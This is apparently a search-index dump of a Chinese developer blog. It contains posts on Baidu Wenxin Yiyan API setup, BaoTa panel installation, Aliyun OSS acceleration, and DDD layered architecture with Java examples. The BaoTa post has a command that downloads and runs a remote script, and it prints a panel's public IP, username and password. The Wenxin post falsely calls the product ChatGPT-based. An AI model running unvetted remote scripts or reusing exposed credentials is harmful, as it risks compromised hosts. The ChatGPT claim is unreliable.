Key。这些是您调用文心一言 API 时需要提供的身份凭证，建议您妥善保管，并定期更换。 您还可以在配置页面中设置您的文心一言 API 调用接口的配额和限流策略，如每日请求次数、每秒请求次数等。这些是为了保障您和其他用户的服务质量和安全性，建议您根据自己的业务需求合理分配，并避免超出限制。 在完成以上配置后，您就可以在配置页面中点击 “在线测试” 按钮，进行文心一言 API 调用接口的测试。测试时，您需要输入一个对话语句，并选择一个对话领域和场景。然后点击 “发送” 按钮，即可查看文心一言 API 返回的对话回复。 # 04 第四步：集成并使用文心一言 API 调用接口 ​ 要集成并使用文心一言 API 调用接口，您需要根据自己的开发环境和语言选择合适的 SDK 或工具，并编写相应的代码。百度智能云提供了多种语言和平台支持的 SDK 或工具，如 Java、Python、PHP、Node.js、Android、iOS 等。您可以通过以下方式进行集成和使用： 在控制台中进入 “自然语言处理” 页面，并点击 “文心一言” 产品下方的 “文档” 按钮，进入文心一言 API 调用接口的文档页面。 在文档页面中，您可以查看并下载您所需要的 SDK 或工具，并参考相关的示例代码和说明进行集成和使用。 在完成集成和使用后，您就可以在您的应用中调用文心一言 API，实现与用户的智能对话功能。 # 结语： ​ 文心一言是百度智能云推出的一款基于大规模自然语言生成模型 (ChatGPT) 的智能对话产品，它可以与用户进行流畅、自然、有趣的多轮对话，涵盖了生活、娱乐、教育、商务等多个领域和场景。本文介绍了作为一个企业客户，如何通过百度智能云提供的全面的 AI 解决方案，快速实现与文心一言的对接和集成。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/05/05/%E3%80%90%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80%E3%80%91%E7%99%BE%E5%BA%A6%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80%E5%A4%A7%E5%9E%8B%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E6%8E%A5%E5%85%A5%E6%95%99%E7%A8%8B/"},{"title":"云服务器部署宝塔面板","text":"购买好服务器后，进入 Xshell： 1. 安装宝塔面板 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh 获得： 123456789101112==================================================================Congratulations! Installed successfully!==================================================================外网面板地址: http://42.193.125.92:8888/ef1f509f内网面板地址: http://172.21.0.3:8888/ef1f509fusername: upqknxq4password: f3701931If you cannot access the panel,release the following panel port [8888] in the security group若无法访问面板，请检查防火墙/安全组是否有放行面板[8888]端口==================================================================Time consumed: 1 Minute! 访问 http://ip:8888/ef1f509f 打开宝塔 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/06/18/%E3%80%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%91%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/"},{"title":"阿里云OSS的CDN加速和OSS传输加速的区别","text":"# 概述 本文主要介绍阿里云对象存储 OSS 的传输加速功能和 CDN 加速 OSS 资源的区别，以便您根据实际业务进行选择。 # 详细信息 阿里云对象存储 OSS 以海量、安全、低成本、高可靠等特点已经成为用户存储静态资源和文件的首要选择，实际使用中面向全球各地用户访问 OSS 资源时，访问速度会受到客户端网络、OSS 的下行带宽、Bucket 地域、访问链路长等限制出现访问慢的情况。以下主要介绍 CDN 加速 OSS 和 OSS 传输加速的加速方式： # 实现原理 具体实现加速的原理如下： CDN 加速 OSS：是建立并覆盖在承载网之上，由遍布全球的边缘节点服务器群组成的分布式网络。阿里云 CDN 能分担源站压力，避免网络拥塞，确保在不同区域、不同场景下加速网站内容的分发，提高资源访问速度。由 CDN 全球广泛分布的边缘节点缓存 OSS 存储的静态数据，从而实现客户端从边缘节点直接获取数据的方式来实现访问的加速。 OSS 传输加速：利用全球分布的云机房，将全球各地用户对您存储空间（Bucket）的访问，经过智能路由解析至就近的接入点，使用优化后的网络及协议，为云存储互联网的上传、下载提供端到端的加速方案。 # 资源加速场景介绍 OSS 传输加速是针对 OSS 的链路加速，使用 OSS 传输加速后支持 OSS 提供的任意特性。CDN 通过全球边缘节点缓存 OSS 资源，加速同时可降低带宽成本。OSS 传输加速和 CDN 加速完全是两个不同的产品，且应对的场景不同，详情请参见 CDN 应用场景和传输加速场景。 如果您的业务是第三方数据源加速，推荐您使用 CDN 加速。 如果您的 OSS 资源需要进行多次下载的操作，并且不要求数据强一致性，推荐您使用 CDN 加速。 如果您的 OSS 资源需要加速下载，并且访问量少，推荐您使用 OSS 传输加速。 如果您的 OSS 资源需要进行多次下载的操作，并且要求数据强一致性，推荐您使用 OSS 传输加速。 如果您的业务存储的是动态资源，且数据更新频繁，推荐您使用 OSS 传输加速。 如果您的业务存储的是静态资源，且更新少，推荐您使用 CDN 加速。 # CDN 加速和 OSS 传输加速的对比 CDN 加速和 OSS 传输加速的使用场景不同，其优缺点对比如下： 加速方式 实现方法 应用场景 优点 缺点 CDN 加速 OSS 通过全球分布的边缘节点缓存数据来实现加速。 网站或应用中小文件大文件的下载视音频点播 CDN 边缘节点全球分布，数量多。CDN 节点提供的服务带宽量大。 对于访问量大的资源，命中率高，访问量小的资源命中率低，节点未缓存的情况下，还是需要回源访问，回源依赖实时的公网回源链路。CDN 静态资源的访问，对于上传、删除等动态请求加速效果不明显。 OSS 传输加速 实现的是客户端到 OSS 服务端之间链路优化来实现的加速功能，实际每次资源的请求还是从 OSS 来进行获取。 远距离数据传输加速 GB、TB 级大文件上传和下载非静态、非热点数据下载加速 OSS 存储节点全球主要区域分布。远距离以及大文件的上传和下载加速。 所有的访问都是回源到 OSS 访问，占用 OSS 的服务带宽。同一区域大量用户集中访问资源的情况下，效果没有 CDN 加速效果好。只能使用 HTTPS 方式访问。 # # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/24/%E3%80%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%91%E9%98%BF%E9%87%8C%E4%BA%91OSS%E7%9A%84CDN%E5%8A%A0%E9%80%9F%E5%92%8COSS%E4%BC%A0%E8%BE%93%E5%8A%A0%E9%80%9F%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"【DDD】DDD分层架构与传统三层架构的区别","text":"# 【DDD】DDD 分层架构与传统三层架构的区别 # 文章目录 DDD 分层与传统三层区别 DDD 分层详解 四层架构图 分层作用 领域对象 DDD 编码实践（改进分层） 代码结构描述 扩展定义注解和接口声明 领域模型注入仓储类的问题 一些个人思考… 项目按上述经典四层架构进行搭建，可以说是 DDD 架构实践么？ 题外话：Spring 与 DDD # DDD 分层与传统三层区别 根据 DDD 领域驱动设计原则，对应的软件架构也需要做出相应的调整。 我们常用的三层架构模型划分为表现层，业务逻辑层，数据访问层等，在 DDD 分层结构中既有联系又有区别， 个人认为主要有如下异同： 在架构设计上，在 DDD 分层结构中将传统三层架构的业务逻辑层拆解为应用层和领域层 其中 Application 划分为很薄的一层服务，非核心的逻辑放到此层去实现，核心的业务逻辑表现下沉到领域层去实现，凝练为更为精确的业务规则集合，通过领域对象去阐述说明。 在建模方式上， DDD 分层的建模思维方式有别于传统三层 传统三层通常是以数据库为起点进行数据库分析设计，而 DDD 则需要以业务领域模型为核心建模（即面向对象建模方式），更能体现对现实世界的抽象。 故在 DDD 分层凸显领域层的重要作用，领域层为系统的核心，包括所有的业务领域模型的抽象表达。 在职责划分上，基础设施层涵盖了 2 方面内容 持久化功能，其中原三层架构的数据访问层下沉到基础设施层的持久化机制实现 通用技术支持，一些公共通用技术支持也放到基础设施层去实现。 # DDD 分层详解 # 四层架构图 在该架构中，上层模块可以调用下层模块，反之不行。即 Interface ——&gt; application | domain | infrastructure application ——&gt; domain | infrastructure domain ——&gt; infrastructure # 分层作用 分层 英文 描述 表现层 User Interface 用户界面层，或者表现层，负责向用户显示解释用户命令 应用层 Application Layer 定义软件要完成的任务，并且指挥协调领域对象进行不同的操作。该层不包含业务领域知识。 领域层 Domain Layer 或称为模型层，系统的核心，负责表达业务概念，业务状态信息以及业务规则。即包含了该领域（问题域）所有复杂的业务知识抽象和规则定义。该层主要精力要放在领域对象分析上，可以从实体，值对象，聚合（聚合根），领域服务，领域事件，仓储，工厂等方面入手 基础设施层 Infrastructure Layer 主要有 2 方面内容，一是为领域模型提供持久化机制，当软件需要持久化能力时候才需要进行规划；一是对其他层提供通用的技术支持能力，如消息通信，通用工具，配置等的实现； # 领域对象 根据战术设计，关注的领域对象主要包括有 类型 英文 描述 值对象 value object 无唯一标识的简单对象 实体 entity 充血的领域模型，有唯一标识 聚合（聚合根） aggregate 实体的聚合，拥有聚合根，可为某一个实体 领域服务 service 无法归类到某个具体领域模型的行为 领域事件 event 不常用 仓储 repository 持久化相关，与基础设施层关联 工厂 factory 负责复杂对象创建 模块 module 子模块引入，可以理解为子域划分 # DDD 编码实践（改进分层） 本文在对上述的传统四层的实践中，（1）根据 依赖倒置原则 对分层结构进行了改进，通过改变不同层的依赖关系（即将基础设施层倒置）来改进具体实现与抽象之间关系；（2）在基础设施层中增加 引用适配层 （防腐层）来增强防御策略，用来统一封装外部系统接口的引用。改进的分层结构如下： 依赖倒置原则（DIP）： 高层模块不依赖于低层模块，两者都依赖于抽象； 抽象不应该依赖于细节，细节应依赖抽象 # 代码结构描述 eg. 后端 Java 代码工程为例， 表现层 在此代码结构中表现为 api层 ，对外暴露接口的最上层 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253├─com.company.microservice├─com.company.microservice│ │ │ ├─apis API接口层 │ │ └─controller 控制器，对外提供（Restful）接口│ │ │ ├─application 应用层│ │ ├─model 数据传输对象模型及其装配器（含校验）│ │ │ ├─assembler 装配器,，实现模型转换eg. apiModel&lt;=&gt; domainModel│ │ │ └─dto 模型定义（含校验规则） │ │ ├─service 应用服务，非核心服务，跨领域的协作、复杂分页查询等│ │ ├─task 任务定义，协调领域模型│ │ ├─listener 事件监听定义│ │ └─*** others│ │ │ ├─domain 领域层│ │ ├─common 模块0-公共代码抽取，限于领域层有效 │ │ ├─module-xxx 模块1-xxx，领域划分的模块，可理解为子域划分 │ │ ├─module-user 模块2-用户子域（领域划分的模块，可理解为子域划分）│ │ │ ├─action 行为定义│ │ │ │ ├─UserDomainService.java 领域服务,用户领域服务│ │ │ │ ├─UserPermissionChecker.java 其他行为，用户权限检查器│ │ │ │ ├─WhenUserCreatedEventPublisher.java 领域事件，当用户创建完成时的事件 │ │ │ ├─model 领域聚合内模型 │ │ │ │ ├─UserEntity.java 领域实体，有唯一标识的充血模型，如本身的CRUD操作在此处│ │ │ │ ├─UserDictVObj.java 领域值对象，用户字典kv定义 │ │ │ | ├─UserDPO.java 领域负载对象 │ │ │ ├─repostiory 领域仓储接口│ │ │ │ ├─UserRepository.java│ │ │ ├─reference 领域适配接口│ │ │ │ ├─UserEmailSenderFacade.java│ │ │ └─factory 领域工厂 │ │ │ ├─infrastructure 基础设施层│ │ ├─persistence 持久化机制│ │ │ ├─converter 持久化模型转换器│ │ │ ├─po 持久化对象定义 │ │ │ └─repository.impl 仓储类，持久化接口&amp;实现，可与ORM映射框架结合│ │ ├─general 通用技术支持，向其他层输出通用服务│ │ │ ├─config 配置类│ │ │ ├─toolkit 工具类 │ │ │ ├─extension 扩展定义 │ │ │ └─common 基础公共模块等 │ │ ├─reference 引用层，包装外部接口用，防止穿插到Domain层腐化领域模型等│ │ │ ├─dto 传输模型定义│ │ │ ├─converter 传输模型转换器 │ │ │ └─facade.impl 适配器具体实现，此处的RPC、Http等调用│ │ │ └─resources │ ├─statics 静态资源│ ├─template 系统页面 │ └─application.yml 全局配置文件 其中在上述目录结构中，Domain 层中为对 module 进行划分，实际上默认该层只有一个模块，根据微服务划分可以进行增加模块来规范代码结构。 示例代码工程： GITHUB 地址：https://github.com/smingjie/bbq-ddd.git # 扩展定义注解和接口声明 （1） 自定义注解 ：在使用 DDD 中自定义了标记的注解 (@DDDAnnotation) 和其衍生子注解，分别是 @DomainAggregate @DomainAggregateRoot @DomainEntity @DomainValueObject @DomainService @DomainRepository @DomainEvent @ApplicationService @DomainAssembler @DomainConverter 等注解，详见代码的 infrastructure.general.extension.ddd.annotation.**；其中有些注解继承了 spring 的 @Component , 将会自动注册为 spring bean，有些注解为了标记用于后续扩展； 引入了 Assembler 装配器 / Converter 转换器，通过组合模式解耦继承关系，在 api 层和持久化层都有相应的实现。 （2） 自定义接口 ：在 domain.common 定义了部分通用的 契约 接口，如领域对象元数据获取接口 IDomainMetaData ，通过接口解耦继承关系。其他还有： IDomainSaveOrUpdate IDomainDelete ... 等 Command # 领域模型注入仓储类的问题 区别于传统的分层后，在 domain 中更多关注业务逻辑，考虑到要与 spring 框架集成，需要注意一个领域模型中注入仓储类的问题 在传统分层中，controller，service，repo 均注册为 spring 管理的 bean， 但是在 domain 层中，service 一部分的业务逻辑划分到了具体的领域对象中去实现了，显然这些对象却不能注册为单例 bean， 因此在此处不能沿用与原来分层结构中 service 层中通过 @Autowired or @Resource 等注入仓储接口， 关于这个问题，此处建议使用 ApplicationContext 实现 即通过一个工具类 ApplicationContextUtils 实现 ApplicationContextAware 获取 bean 的方法，即 getBean() 方法， 然后我们就可以在我们的领域模型中直接应用该工具类来获取 Spring 托管的 singleton 对象，即 xxxRepo=ApplicationContextUtils.getBean (“xxxRepository”) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849@Componentpublic class ApplicationContextUtils implements ApplicationContextAware { public static ApplicationContext appctx; @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException { ApplicationContextUtil.appctx=applicationContext; } /** * @return ApplicationContext */ public static ApplicationContext getApplicationContext() { return appctx; } /** * 获取对象 * * @param name spring配置文件中配置的bean名或注解的名称 * @return 一个以所给名字注册的bean的实例 * @throws BeansException 抛出spring异常 */ public static &lt;T&gt; T getBean(String name) throws BeansException { return (T) appctx.getBean(name); } /** * 获取类型为requiredType的对象 * * @param clazz 需要获取的bean的类型 * @return 该类型的一个在ioc容器中的bean * @throws BeansException 抛出spring异常 */ public static &lt;T&gt; T getBean(Class&lt;T&gt; clazz) throws BeansException { return appctx.getBean(clazz); } /** * 如果ioc容器中包含一个与所给名称匹配的bean定义，则返回true否则返回false * * @param name ioc容器中注册的bean名称 * @return 存在返回true否则返回false */ public static boolean containsBean(String name) { return appctx.containsBean(name); }} 考虑到代码结构简洁性，还可以封装一层仓储工厂，只用来获取相应的仓储 Bean 。 12345678910111213141516171819202122232425/** * 简化版的仓储工厂--用来统一获取仓储的实现Bean * * @author jockeys * @date 2020/9/12 */public class RepoFactory { /** * 根据仓储接口类型获取对应实现且默认取值第一个 * * @param tClass 具体目标类型 * @param &lt;T&gt; 仓储接口类型 * @return 如果不是指定实现，默认获得第一个实现Bean */ public static &lt;T&gt; T get(Class&lt;? extends T&gt; tClass) { Map&lt;String, ? extends T&gt; map = ApplicationUtils.getApplicationContext().getBeansOfType(tClass); Collection&lt;? extends T&gt; collection = map.values(); if (collection.isEmpty()) { throw new PersistException(&quot;未找到仓储接口或其指定的实现:&quot; + tClass.getSimpleName() ); } return collection.stream().findFirst().get(); }} 然后在领域模型中就可以直接调用该工厂方法来获取仓储接口的实现， 比如 DictRepo 为定义的仓储接口， DictDao 为该接口的准实现类 1234//直接指定实现DictRepo repo= RepoFactory.get(DictDao.class);//不指定实现取Spring容器中默认注册第1位的BeanDictRepo repo= RepoFactory.get(DictRepo.class); # 一些个人思考… 上述经典四层架构，笔者更愿意理解为 DDD 在编码实现阶段的一个体现或应用。 补充一点：DDD 除了在编码实践阶段，还体现在需求分析、设计阶段等过程，DDD 推荐不割裂系统的需求和设计，我们这里可以合并称作系统建模过程，可参考 DDD - 建模过程分析一文，不再赘述。 当然除了这个经典四层架构模型，DDD 还有五层架构、六边形架构等，所以这里抛出一个问题， # 项目按上述经典四层架构进行搭建，可以说是 DDD 架构实践么？ 关于这个问题，笔者想引入一对哲学概念，哲学有言形式与内容，现象与本质等辩证关系（当然与本文可能也没啥太大关系啦）；从这两个角度来阐述本人的观点： 形式与内容：经典四层架构是一个 DDD 实现的形式，相当于给我们提供了一个框框来让我们自己去实现；在这个框框里面我们怎么实现是自由发挥的，但也是有约束的，这个约束体现在 DDD 对每一层的作用的约定，如每个层约定做了什么功能，充当什么角色等。尤其是对 Domain 层的约定，才是最重要的。那么我们按照哲学辩证的套话来说，形式上满足了 DDD 架构，但这应该是片面的，具体还要看内容，即具体实现是怎样的。 现象与本质：接着上述观点，如果要看实现，就要具体分析一下现象与本质嘞。上面笔者也有提到，DDD 除了四层经典架构，还有五层架构（包括其演化的多层架构）、六边形架构等也都是 DDD 提供的架构模型（形式），那这些都可以理解 DDD 架构模式的外显形式，那么又有哪些共性呢？可自行查询，本文直接给结论，即 它们都有 Domain 层，Domain 层，Domain 层 （重要的事情说三遍～～，该结论 DDD 作者译著有写到…），所以不管架构模式怎么演化，Domain 是核心不能变。 那么如上分析，我们在回到这个问题，我们是不是可以给出一个这样的答案： 形式上符合 DDD 架构，具体是不是 DDD 的架构实践，本质上还要看 （1）项目是否包括有 Domain 层； （2）Domain 层是否满足 DDD 战术篇的要求（或者可暂时简单理解为充血模型吧） # 题外话：Spring 与 DDD Spring 框架中，Spring 为我们提供了 @Service @Repository 等注解，为我们分离行为和行为（注册为 Bean）和属性（数据模型），同时通过 @Autowired 在合适地方进行注入行为，因为行为被注册为 Spring 容器中的 Bean 后，减少了频繁创建行为的开销，只有属性的数据模型作为数据的载体来传递数据。提供很大的便捷性。但也阻碍了我们应用 DDD 编码实践， Spring 框架主张分离，DDD 思想主张合并，我们在 Spring 框架中使用 DDD 则需要在其基础上进行一些权衡取舍，即 如何将注册为 Bean 的行为穿插到原有的贫血模型中来构建充血模型是我们要解决的问题 关于这个问题，笔者使用了 Spring 框架提供的获取容器内已经注册的 Bean 接口，直接调用接口，在有属性的领域模型中来获取行为；主要还是体现融入领域模型中的部分 Service 获取仓储接口来实现持久化过程。 当然，上述的说明都是从一个软件开发人员的角度来阐述说明 DDD 在编码实践阶段的应用 。 除此之外在业务领域的建模分析过程中也可引入该概念。 比如我们现在所倡导的微服务化，如何划分或拆分微服务；如何有效地区分限界上下文，划分子域；如何构建一个有效的聚合，识别聚合根等。。。 附在最后的，关于笔者对于 DDD 在需求设计阶段应用的学习总结 DDD - 建模分析过程","link":"/2023/01/06/%E3%80%90%E6%9E%B6%E6%9E%84%E3%80%91DDD%E5%88%86%E5%B1%82%E6%9E%B6%E6%9E%84%E4%B8%8E%E4%BC%A0%E7%BB%9F%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"【架构】DDD分层架构模型","text":"# 【架构】DDD 分层架构模型 还在单体应用的时候就是分层架构一说，我们用得最多的就是三层架构。而现在已经是微服务时代，在微服务架构模型比较常用的有几个，例如：整洁架构，CQRS（命令查询分离）以及六边形架构。每种架构模型都有自己的应用场景，但其核心都是 “高内聚低耦合” 原则。而运用领域驱动设计（DDD）理念以应对日常加速的业务变化对架构的影响，架构的边界越来越清晰，各司其职，这也符合微服务架构的设计思想。以领域驱动设计（DDD）为理念的分层架构已经成为微服务架构实践的最佳实践方法。 # 一、什么是 DDD 分层架构 # 1. 传统三层架构 要了解 DDD 分层架构，首先先了解传统的三层架构。 传统三层架构流程： 第一步考虑的是数据库设计，数据表如何建，表之间的关系如何设计 第二步就是搭建数据访问层，如选一个 ORM 框架或者拼接 SQL 操作 第三步就是业务逻辑的实现，由于我们先设计了数据库，我们整个的思考都会围绕着数据库，想着怎么写才能把数据正确地写入数据库中，这时 CRUD 的标准作法就出现了，也就没有太多考虑面向对象，解耦的事情了，这样的代码对日常的维护自然是越来越困难的 第四步表示层主要面向用户的输出 # 2. DDD 分层架构 为了解决高耦合问题并轻松应对以后的系统变化，我们提出了运用领域驱动设计的理念来设计架构。 此段落部分总结来源于欧创新《DDD 实践课》的《07 | DDD 分层架构：有效降低层与层之间的依赖》读后感 # 1）领域层 首先我们抛开数据库的困扰，先从业务逻辑入手开始，设计时不再考虑数据库的实现。将以前的业务逻辑层（BLL）拆分成了领域层和应用层。 领域层聚焦业务对象的业务逻辑实现，体现现实世界业务的逻辑变化。它用来表达业务概念、业务状态和业务规则，对于业务分析可参照：《使用领域驱动设计分析业务》 # 2）应用层 应用层是领域层的上层，依赖领域层，是各聚合的协调和编排，原则上是不包括任何业务逻辑。它以较粗粒度的封闭为前端接口提供支持。除了提供上层调用外，还可以包括事件和消息的订阅。 # 3） 用户接口层 用户接口层面向用户访问的数据入向接口，可按不同场景提供不一样的用户接口实现。面向 Web 的可使用 http restful 的方式提供服务，可增加安全认证、权限校验，日志记录等功能；面向微服务的可使用 RPC 方式提供服务，可增加限流、熔断等功能。 # 4） 基础设施层 基础设施层是数据的出向接口，封装数据调用的技术细节。可为其它任意层提供服务，但为了解决耦合的问题采用了依赖倒置原则。其它层只依赖基础设施的接口，于具体实现进行分离。 # 二、DDD 分层代码实现 # 1. 结构模型 # 2. 目录结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455.├── pom.xml└── src ├── main │ ├── java │ │ └── fun │ │ └── barryhome │ │ └── ddd │ │ ├── WalletApplication.java │ │ ├── application │ │ │ ├── TradeEventProcessor.java │ │ │ ├── TradeMQReceiver.java │ │ │ └── TradeManager.java │ │ ├── constant │ │ │ └── MessageConstant.java │ │ ├── controller │ │ │ ├── TradeController.java │ │ │ ├── WalletController.java │ │ │ └── dto │ │ │ └── TradeDTO.java │ │ ├── domain │ │ │ ├── TradeService.java │ │ │ ├── TradeServiceImpl.java │ │ │ ├── enums │ │ │ │ ├── InOutFlag.java │ │ │ │ ├── TradeStatus.java │ │ │ │ ├── TradeType.java │ │ │ │ └── WalletStatus.java │ │ │ ├── event │ │ │ │ └── TradeEvent.java │ │ │ ├── model │ │ │ │ ├── BaseEntity.java │ │ │ │ ├── TradeRecord.java │ │ │ │ └── Wallet.java │ │ │ └── repository │ │ │ ├── TradeRepository.java │ │ │ └── WalletRepository.java │ │ └── infrastructure │ │ ├── TradeRepositoryImpl.java │ │ ├── WalletRepositoryImpl.java │ │ ├── cache │ │ │ └── Redis.java │ │ ├── client │ │ │ ├── AuthFeignClient.java │ │ │ └── LocalAuthClient.java │ │ ├── jpa │ │ │ ├── JpaTradeRepository.java │ │ │ └── JpaWalletRepository.java │ │ └── mq │ │ └── RabbitMQSender.java │ └── resources │ ├── application.properties │ └── rabbitmq-spring.xml └── test └── java 此结构为单一微服务的简单结构，各层在同一个模块中。 在大型项目开发过程中，为了达到核心模块的权限控制或更好的灵活性可适当调整结构，可参考《 数字钱包系统》系统结构 # 3. 领域层实现（domain） 在业务分析（《使用领域驱动设计分析业务》）之后，开始编写代码，首先就是写领域层，创建领域对象和领域服务接口 # 1）领域对象 这里的领域对象包括实体对象、值对象。 实体对象：具有唯一标识，能单独存在且可变化的对象 值对象：不能单独存在或在逻辑层面单独存在无意义，且不可变化的对象 聚合：多个对象的集合，对外是一个整体 聚合根：聚合中可代表整个业务操作的实体对象，通过它提供对外访问操作，它维护聚合内部的数据一致性，它是聚合中对象的管理者 代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// 交易public class TradeRecord extends BaseEntity { /** * 交易号 */ @Column(unique = true) private String tradeNumber; /** * 交易金额 */ private BigDecimal tradeAmount; /** * 交易类型 */ @Enumerated(EnumType.STRING) private TradeType tradeType; /** * 交易余额 */ private BigDecimal balance; /** * 钱包 */ @ManyToOne private Wallet wallet; /** * 交易状态 */ @Enumerated(EnumType.STRING) private TradeStatus tradeStatus; @DomainEvents public List&lt;Object&gt; domainEvents() { return Collections.singletonList(new TradeEvent(this)); }} // 钱包public class Wallet extends BaseEntity { /** * 钱包ID */ @Id private String walletId; /** * 密码 */ private String password; /** * 状态 */ @Enumerated(EnumType.STRING) private WalletStatus walletStatus = WalletStatus.AVAILABLE; /** * 用户Id */ private Integer userId; /** * 余额 */ private BigDecimal balance = BigDecimal.ZERO; } 从钱包交易例子的系统设计中，钱包的任何操作如：充值、消息等都是通过交易对象驱动钱包余额的变化 交易对象和钱包对象均为实体对象且组成聚合关系，交易对象是钱包交易业务模型的聚合根，代表聚合向外提供调用服务 经过分析交易对象与钱包对象为 1 对多关系（@ManyToOne），这里采用了 JPA 做 ORM 架构，更多 JPA 实践请参考 &gt;&gt; 这里的领域建模使用的是贫血模型，结构简单，职责单一，相互隔离性好但缺乏面向对象设计思想，关于领域建模可参考《领域建模的贫血模型与充血模型》 domainEvents () 为领域事件发布的一种实现，作用是交易对象任何的数据操作都将触发事件的发布，再配合事件订阅实现事件驱动设计模型，当然也可以有别的实现方式 # 2）领域服务 123456789101112131415161718192021222324252627/** * Created on 2020/9/7 11:40 上午 * * @author barry * Description: 交易服务 */public interface TradeService { /** * 充值 * * @param tradeRecord * @return */ TradeRecord recharge(TradeRecord tradeRecord); /** * 消费 * * @param tradeRecord * @return */ TradeRecord consume(TradeRecord tradeRecord);} 先定义服务接口，接口的定义需要遵循现实业务的操作，切勿以程序逻辑或数据库逻辑来设计定义出增删改查 主要的思考方向是交易对象对外可提供哪些服务，这种服务的定义是粗粒度且高内聚的，切勿将某些具体代码实现层面的方法定义出来 接口的输入输出参数尽量考虑以对象的形式，充分兼容各种场景变化 关于前端需要的复杂查询方法可不在此定义，一般情况下查询并非是一种领域服务且没有数据变化，可单独处理 领域服务的实现主要关注逻辑实现，切勿包含技术基础类代码，比如缓存实现，数据库实现，远程调用等 # 3）基础设施接口 123456789101112131415161718192021222324252627282930public interface TradeRepository { /** * 保存 * @param tradeRecord * @return */ TradeRecord save(TradeRecord tradeRecord); /** * 查询订单 * @param tradeNumber * @return */ TradeRecord findByTradeNumber(String tradeNumber); /** * 发送MQ事件消息 * @param tradeEvent */ void sendMQEvent(TradeEvent tradeEvent); /** * 获取所有 * @return */ List&lt;TradeRecord&gt; findAll();} 基础设施接口放在领域层主要的目的是减少领域层对基础设施层的依赖 接口的设计是不可暴露实现的技术细节，如不能将拼装的 SQL 作为参数 # 4. 应用层实现（application） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// 交易服务@Componentpublic class TradeManager { private final TradeService tradeService; public TradeManager(TradeService tradeService) { this.tradeService = tradeService; } // 充值 @Transactional(rollbackFor = Exception.class) public TradeRecord recharge(TradeRecord tradeRecord) { return tradeService.recharge(tradeRecord); } // 消费 @Transactional(rollbackFor = Exception.class) public TradeRecord consume(TradeRecord tradeRecord) { return tradeService.consume(tradeRecord); }} // 交易事件订阅@Componentpublic class TradeEventProcessor { @Autowired private TradeRepository tradeRepository; @TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT, condition = &quot;# tradeEvent.tradeStatus.name() == 'SUCCEED'&quot;) public void TradeSucceed(TradeEvent tradeEvent) { tradeRepository.sendMQEvent(tradeEvent); }} // 交易消息订阅@Componentpublic class TradeMQReceiver { @RabbitListener(queues = &quot;ddd-trade-succeed&quot;) public void receiveTradeMessage(TradeEvent tradeEvent){ System.err.println(&quot;========MQ Receiver============&quot;); System.err.println(tradeEvent); }} 应用服务： 应用层是很薄的一层，主要用于调用和组合领域服务，切勿包含任何业务逻辑 可包括少量的流程参数判断 由于可能是多个领域服务组合操作调用，如果存在原子性要求可以增加 **@Transactional** 事务控制 事件订阅： 事件订阅是进程内多个领域操作协作解耦的一种实现方式，它也是进程内所有后续操作的接入口 它与应用服务的组合操作用途不一样，组合是根据场景需求可增可减，但事件订阅后的操作是相对固化的，主要是满足逻辑的一致性要求 TransactionPhase.AFTER_COMMIT 配置是在前一操作事务完成后再调用，从而减少后续操作对前操作的影响 事件订阅可能会有多个消息主体，为了方便管理最好统一在一个类里处理 MQ 消息发布一般放在事件订阅中 消息订阅： 消息订阅是多个微服务间协作解耦的一步实现方式 消息体尽量以统一的对象包装进行传递，降低对象异构带来的处理难度 # 5. 基础设施层（infrastructure） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@Repositorypublic class TradeRepositoryImpl implements TradeRepository { private final JpaTradeRepository jpaTradeRepository; private final RabbitMQSender rabbitMQSender; private final Redis redis; public TradeRepositoryImpl(JpaTradeRepository jpaTradeRepository, RabbitMQSender rabbitMQSender, Redis redis) { this.jpaTradeRepository = jpaTradeRepository; this.rabbitMQSender = rabbitMQSender; this.redis = redis; } @Override public TradeRecord save(TradeRecord tradeRecord) { return jpaTradeRepository.save(tradeRecord); } /** * 查询订单 */ @Override public TradeRecord findByTradeNumber(String tradeNumber) { TradeRecord tradeRecord = redis.getTrade(tradeNumber); if (tradeRecord == null){ tradeRecord = jpaTradeRepository.findFirstByTradeNumber(tradeNumber); // 缓存 redis.cacheTrade(tradeRecord); } return tradeRecord; } /** * 发送事件消息 * @param tradeEvent */ @Override public void sendMQEvent(TradeEvent tradeEvent) { // 发送消息 rabbitMQSender.sendMQTradeEvent(tradeEvent); } /** * 获取所有 */ @Override public List&lt;TradeRecord&gt; findAll() { return jpaTradeRepository.findAll(); }} 基础设施层是数据的输出向，主要包含数据库、缓存、消息队列、远程访问等的技术实现 基础设计层对外隐藏技术实现细节，提供粗粒度的数据输出服务 数据库操作：领域层传递的是数据对象，在这里可以按数据表的实现方式进行拆分实现 # 6. 用户接口层（controller） 